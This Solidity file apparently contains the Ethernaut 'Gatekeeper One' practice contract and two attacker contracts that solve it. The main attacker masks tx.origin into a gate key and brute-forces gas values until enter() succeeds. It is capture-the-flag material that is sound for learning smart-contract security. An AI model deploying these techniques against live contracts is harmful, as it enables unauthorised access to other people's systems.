// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(tx.origin),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneAttacker {
    function attack(address _victim, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;
        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
            (bool success, ) = address(_victim).call{gas: i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                succeeded = success;
                break;
            }
        }
        return succeeded;
    }
}

contract GatekeeperOneGasGuess {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(uint64(tx.origin));
        (bool success, ) = address(_gateAddr).call.gas(_gas)(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        return success;
    }
}
